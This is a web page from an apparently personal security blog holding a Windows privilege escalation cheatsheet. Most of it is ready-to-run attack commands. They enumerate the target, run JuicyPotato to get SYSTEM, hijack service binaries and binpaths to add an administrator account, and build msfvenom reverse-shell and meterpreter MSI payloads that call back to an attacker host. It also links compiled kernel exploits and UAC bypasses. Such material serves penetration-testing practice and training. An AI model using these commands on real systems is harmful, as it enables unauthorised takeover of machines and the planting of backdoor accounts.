<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Windows privilege escalation cheatsheet</title>
  <meta name="description" content="Windows privilege escalation cheatsheet">

  <!-- Social: Twitter -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:site" content="@hunspook">
  <meta name="twitter:title" content="Windows privilege escalation cheatsheet">
  <meta name="twitter:description" content="Windows privilege escalation cheatsheet">
  
  <meta property="twitter:image:src" content="https://hunspook.github.io/assets/img/opengraph.png">
  

  <!-- Social: Facebook / Open Graph -->
  <meta property="og:url" content="https://hunspook.github.io/dropdown/Windows-privilege-escalation-cheatsheet.html">
  <meta property="og:title" content="Windows privilege escalation cheatsheet">
  
  <meta property="og:image" content="https://hunspook.github.io/assets/img/opengraph.png">
  
  <meta property="og:description" content="Windows privilege escalation cheatsheet">
  <meta property="og:site_name" content="HunSpook">

  <!-- Social: Schema.org  -->
  <meta itemprop="name" content="Windows privilege escalation cheatsheet"/>
  <meta itemprop="description" content="Windows privilege escalation cheatsheet">
  <meta itemprop="image" content="https://hunspook.github.io/assets/img/opengraph.png"/>

  <!-- Favicon -->
  <link rel="shortcut icon" href="/assets/img/icons/favicon.ico" type="image/x-icon" />

  <!-- Android Lolipop Theme Color -->
  <meta name="theme-color" content="#2a4d14">

  <!-- Styles -->
  <link rel="stylesheet" id="css-theme" href="/assets/css/main-dark.css">
  <link rel="stylesheet" href="/assets/css/highlight/gruvbox.css">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">

  <!-- Javascript -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/4.3.0/d3.min.js"></script>
  <script type="text/javascript" src="/assets/js/main.js"></script>
</head>


<body class="animated fadeIn">
  <div class="container">
    <div id="background-div">
      <svg id="background-svg">
        <lineargradient id="Gradient1" x1="0" x2="0" y1="0" y2="1">
          <stop stop-opacity="0" class="bgColor2" offset="0%" />
          <stop stop-opacity="0.5" class="bgColor2" offset="10%" />
          <stop stop-opacity="0.5" class="bgColor1" offset="40%" />
          <stop stop-opacity="0" class="bgColor1" offset="100%" />
        </lineargradient>
        <g id="bg-layer1"></g>
        <g id="bg-layer2" class="hide"></g>
        <g id="bg-layer3"></g>
        <g id="bg-layer4"></g>
      </svg>
    </div>
    <section class="header">
      <header>
  <div class="row">
    <div class="col-xs-12">
      <nav class="navbar navbar-default navbar-fixed-top">
        <div class="container">
          <div class="navbar-header">
            <a class="navbar-toggle collapsed navbar-icon" data-toggle="collapse"
              data-target="#bs-example-navbar-collapse-1">
              <i class="fa fa-bars fa-2x"></i>
            </a>
            <a class="navbar-brand navbar-icon" href="/">
                <i class="fa fa-home fa-2x"></i>
            </a>
          </div>

          <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
              <li><a href="/">Home</a></li>
              

              
                <li class="dropdown dropdown-Cheatsheets">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Cheatsheets
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-Acerda De">
                    <li priority="1"><a href="/dropdown/Acerda-de-.html">Acerda De</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Cheatsheets">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Cheatsheets
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-Linux privilege escalation cheatsheet">
                    <li priority="1"><a href="/dropdown/Linux-privilege-escalation-cheatsheet.html">Linux privilege escalation cheatsheet</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - Mr. Robot">
                    <li priority="1"><a href="/dropdown/VulnHub-Mr.Robot.html">VulnHub - Mr. Robot</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - NullByte">
                    <li priority="1"><a href="/dropdown/VulnHub-NullByte.html">VulnHub - NullByte</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - Photographer">
                    <li priority="1"><a href="/dropdown/VulnHub-Photographer.html">VulnHub - Photographer</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - SickOS1.1">
                    <li priority="1"><a href="/dropdown/VulnHub-SickOS1.1.html">VulnHub - SickOS1.1</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - SickOS1.2">
                    <li priority="1"><a href="/dropdown/VulnHub-SickOS1.2.html">VulnHub - SickOS1.2</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Walkthroughs">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Walkthroughs
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-VulnHub - SkyTower">
                    <li priority="1"><a href="/dropdown/VulnHub-SkyTower.html">VulnHub - SkyTower</a></li>
                  </ul>
                </li>
              
                <li class="dropdown dropdown-Cheatsheets">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                    role="button" aria-haspopup="true" aria-expanded="false">Cheatsheets
                    <span class="caret"></span>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-Windows privilege escalation cheatsheet">
                    <li priority="1"><a href="/dropdown/Windows-privilege-escalation-cheatsheet.html">Windows privilege escalation cheatsheet</a></li>
                  </ul>
                </li>
              
              

              <script>
                // clean repeated dropdowns and add <li> to their positions
                let done = [];
                let elements = [];
                $(".dropdown")
                  //
                  .each((index0 , value0) => {
                    let dropdownClass = "."+$(value0)[0].classList[1];
                    if (done.indexOf(dropdownClass) !== -1) return
                    done.push(dropdownClass)
                    let dropdownMain = $(dropdownClass)[0]
                    let itemsList = $(dropdownClass+">ul>li").sort((a, b) => parseInt(b.getAttribute("priority") || -9999999) - parseInt(a.getAttribute("priority") || -9999999))
                    $(dropdownClass+">ul>li").remove();
                    $(dropdownClass+">ul").append(itemsList)
                    $(dropdownClass).remove();
                    elements.push(dropdownMain)
                });
                let priority = [ "About",  "dropdown", ];
                elements = elements.concat(...$(".nav-item").remove())
                priority.map(text => {
                  elements = elements.filter(node => {
                      let nodeText = node.querySelector("a").textContent.trim()
                      if (text == nodeText) {
                          $(".nav").append(node)
                          return false;
                      }
                      return true;
                  })
                });
                $(".nav").append(elements)
              </script>
            </ul>
          </div>
        </div>
      </nav>
    </div>
  </div>
</header>

    </section>
    <section class="content">
      <div class="row">
        <!-- <div class="col-sm-2">
          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
          <div class="left-pane">
          </div>
        </div> -->
        <div class="col-sm-8 col-sm-offset-2 content-div">
          <div class="page-separator hidden-xs">
            <h1 class="h1-strip" style="padding-bottom:8em; margin-bottom: 0;"></h1>
          </div>
          <div class="page-separator visible-xs">
            <h1 class="h1-strip" style="padding-bottom:2em; margin-bottom: 0;"></h1>
          </div>
          <h1 class="post-title page-title" id="title"><a href="#title">Windows privilege escalation cheatsheet</a></h1>
          <h2 id="system-enumeration">System enumeration</h2>

<p><strong>Which OS the target is running? Are there any hot fixes installed?</strong></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn
</span></code></pre></div></div>

<p>Save the output of <em>systeminfo</em> in <em>systeminfo.txt</em> on your attacking machine and execute the following commands:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2020-03-09-mssb.xls --systeminfo systeminfo.txt
</span></code></pre></div></div>

<p><em>windows-exploit-suggester.py</em> can be found on <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">AonCyberLabs Github</a>.</p>

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
   Since Microsoft stopped maintaining the security bulletin search; the Windows Exploit Suggester database will not include any vulnerabilities or
exploits found after March 2017. Nevertheless, this is still a usefull tool for older machines.
      </div>
    </div>

<p>Compiled Kernel exploit are available on <a href="https://github.com/SecWiki/windows-kernel-exploits/">SecWiki Github repository</a>.</p>

<p><strong>Can we exploit 3rd party drivers?</strong></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">driverquery /v
</span></code></pre></div></div>

<h2 id="user-enumeration">User enumeration</h2>

<p><strong>Who am I running as? Which privileges do I have?</strong></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">whoami
whoami /all
net user /priv
net user
net user username
</span></code></pre></div></div>

<p>If the user has SeImpersonate or SeAssignPrimaryToken privileges then you can use <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> and become SYSTEM.</p>

<p>To use the JuicyPotato exploit, run the following:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
</span></code></pre></div></div>

<p>You can find a CLSID that works for your target from <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">ohpe Github</a>. You can also change the process to be executed with a reverse shell to your target.</p>

<p><em>Note: Windows Server 2019 is not affected by this vulnerability.</em></p>

<h2 id="firewall-status-and-rules-enumeration">Firewall status and rules enumeration</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
</span></code></pre></div></div>

<h2 id="process-enumeration">Process enumeration</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">tasklist /SVC
</span></code></pre></div></div>

<h2 id="insecure-file-permissions-enumeration">Insecure file permissions enumeration</h2>

<p><strong>Can we replace a service running as a privileged user? Can we modify its path?</strong></p>

<p>Run the following command in Powershell and look for weird programs:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$</span>_.State <span class="nt">-like</span> <span class="s1">'Running'</span><span class="o">}</span>
</code></pre></div></div>

<p>Once you spot a weird service (Let’s refer to it as weird.exe from now on); use <em>icacls</em> to determine if the current user can modify it or not:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">icacls "c:\program files\weird.exe"
</span></code></pre></div></div>

<p>If the user can modify the program; you should see <em>BUILTIN\Users: (I)(F)</em> in the output of the above command. If this is the case; you can replace the program with a malicious one (same name) and restart it:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">net stop weird
</span></code></pre></div></div>

<p>If you do not have permission to restart the program; check its start mode. If it’s automatic;you can restart the machine instead:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wmic service where caption="weird" get name, caption, state, startmode
shutdown /r /t 0
</span></code></pre></div></div>

<p>Another way to exploit a misconfigured service is by changing its path using <em>sc config</em> command.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sc config [service name] binpath= "malicious executable path"
</span></code></pre></div></div>

<p>You can even exploit the path to add a new admin user:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sc config [service name] binpath= "net user admin password /add"
sc config [service name] binpath= "net localgroup Administrators admin /add"
</span></code></pre></div></div>

<p>You will need to restart the service for the exploit to work:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sc stop [service name]
sc start [service name]
</span></code></pre></div></div>

<p><em>Note: <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk.exe</a> is also a very useful tool to check for service permissions on Windows.</em></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">accesschk.exe -uwcqv "Authenticated Users" * /accepteula
</span></code></pre></div></div>

<p>If the authenticated user has write permissions to the service; the output of the above command would be: <em>RW [service name] SERVICE_ALL_ACCESS</em></p>

<h2 id="unquoted-service-path-enumeration">Unquoted service path enumeration</h2>

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
    If an executable is enclosed in quote tags "";Windows will know where to find it when it attempts to execute it. However, if the executable is not enclosed in quote tags and the path contains one or more spaces; Windows will handle the space as a break and pass the rest of the service path as an argument. If we have write permissions to any of the folders containing spaces, we can exploit the unquoted service path vulnerability.
      </div>
    </div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
</span></code></pre></div></div>

<p>Let’s say we found an executable located under C:\Program Files\folder A\folder B\executable.exe and its path is not enclosed in quote tags.</p>

<p>Let’s see if we have write permissions to any of the folders:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">icacls "C:\Program Files\"
icacls "C:\Program Files\folder A"
icacls "C:\Program Files\folder A\folder B"
</span></code></pre></div></div>

<p>If we had write permissions on the ‘C:' directory we can create the following payload: ‘C:\Program.exe’. This is highly unlikely though but it is very common to have write permissions in application directories. If we have permissions to write in the
‘C:\Program Files\folder A’ directory we will put our reverse shell there and name it folder.exe.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">msfvenom -p windows/shell_reverse_tcp LHOST=[LHOST IP] LPORT=443 -f exe -o folder.exe
</span></code></pre></div></div>

<p>We can now either restart the service or the target if the service start mode is Auto.</p>

<h2 id="binaries-that-auto-elevate-enumeration">Binaries that auto elevate enumeration</h2>

<p>We need to check the status of the AlwaysInstallElevated registry setting. If this key is enabled (set to 1) in either HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE, any user can run Windows Installer packages with elevated privileges.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</span></code></pre></div></div>

<p>Use <em>msfvenom</em> to create a malicious msi installer:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[LHOST IP]
LPORT=443 -f msi -o exploit.msi
</span></code></pre></div></div>

<p>In order to execute the msi installer, run the following:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">msiexec /quiet /qn /i C:\Users\exploit.msi
</span></code></pre></div></div>

<p><em>Note:</em> To exploit this vulnerability with Metasploit you can use exploit/windows/local/always_install_elevated.</p>

<h2 id="unattended-installs-enumeration">Unattended installs enumeration</h2>

<div class="panel panel-info">
      <div class="panel-heading">
        <h3 class="panel-title">Info:</h3>
      </div>
      <div class="panel-body">
    Unattended installations often use a file of predefined answers so that after starting the installation, it runs to completion without further user intervention. If administrators fail to clean up after such a process, an EXtensible Markup Language
(XML) file called Unattend is left on the local system. This file may contain sensitive information.
      </div>
    </div>

<p>Unattended files are most likely found under:</p>

<ul>
  <li>C:\Windows\Panther\</li>
  <li>C:\Windows\Panther\Unattend\</li>
  <li>C:\Windows\System32\</li>
  <li>C:\Windows\System32\sysprep\</li>
</ul>

<p>Search the directories for these files:</p>

<ul>
  <li>Unattend.xml</li>
  <li>Unattended.xml</li>
  <li>Unattend.txt</li>
  <li>sysprep.xml</li>
  <li>sysprep.inf</li>
</ul>

<h2 id="uac-bypass">UAC bypass</h2>

<p>In order to bypass UAC; you need to be part of the administrator’s group. Pentestlab published a detailed <a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">blog</a> on how to accomplish this using foothelper.exe.</p>

<p><em>Note: You can bypass UAC with Metasploit using exploit/windows/local/bypassuac.</em></p>

<h2 id="automated-scripts">Automated scripts</h2>

<ol>
  <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></li>
  <li><a href="https://github.com/411Hall/JAWS">JAWS</a></li>
  <li><a href="https://github.com/M4ximuss/Powerless">Powerless</a></li>
  <li><a href="https://github.com/rasta-mouse/Watson">Watson</a></li>
  <li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a></li>
</ol>

<h3 id="references--further-readings">References &amp; Further readings</h3>

<ul>
  <li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation</a></li>
  <li><a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/</a></li>
</ul>


        </div>
        <div class="col-sm-2">
          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
          <div class="pane-separator visible-xs" style="margin-bottom:5em;"></div>
          <div class="right-pane" style="margin-left: 1em;">
            
              <div class="avatar">
                <center>
                  
                    <img src="/assets/img/avatar.jpeg" alt="me" class="avatar-image">
                  
                  
                    <p class="avatar-description"></p>
                  
                  <div class="right-links">
                    
<a href="https://github.com/hunspook" target="_blank">
  <i class="fa fa-github fa-3x"></i>
</a>




<a href="https://twitter.com/hunspook" target="_blank">
  <i class="fa fa-twitter fa-3x"></i>
</a>



                  </div>
                </center>
              </div>
            
            
          </div>
        </div>
      </div>
    </section>
    <section class="footer">
      <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <title></title>
  <meta name="Generator" content="Cocoa HTML Writer">
  <meta name="CocoaVersion" content="1894.4">
  <style type="text/css">
    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; text-align: center; font: 12.0px Times; color: #000000; -webkit-text-stroke: #000000}
    span.s1 {font-kerning: none}
  </style>
</head>
<body>
<p class="p1"><span class="s1"></span></p>
<p class="p1"><span class="s1">
<a href="https://github.com/hunspook" target="_blank">
  <i class="fa fa-github fa-3x"></i>
</a>




<a href="https://twitter.com/hunspook" target="_blank">
  <i class="fa fa-twitter fa-3x"></i>
</a>


<span class="Apple-converted-space"> </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space"> </span></span></p>
</body>
</html>

    </section>
  </div>
</body>

</html>
